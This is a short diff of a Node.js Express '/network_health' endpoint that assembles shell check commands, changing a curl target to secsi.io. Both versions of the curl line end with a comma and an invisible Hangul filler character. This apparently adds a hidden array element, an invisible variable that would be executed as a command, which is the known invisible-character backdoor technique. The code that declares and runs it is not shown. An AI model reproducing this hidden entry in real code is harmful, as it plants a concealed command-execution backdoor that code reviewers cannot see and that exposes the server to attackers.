@@ -15,7 +15,7 @@ app.get('/network_health', async (req, res) => {
     const isWin = process.platform === "win32";
     const checkCommands = [
         isWin ? 'ping google.com' : "ping -c 1 google.com",
-        'curl -s http://example.com/',ㅤ
+        'curl -s http://secsi.io/',ㅤ
     ];
 
     try {
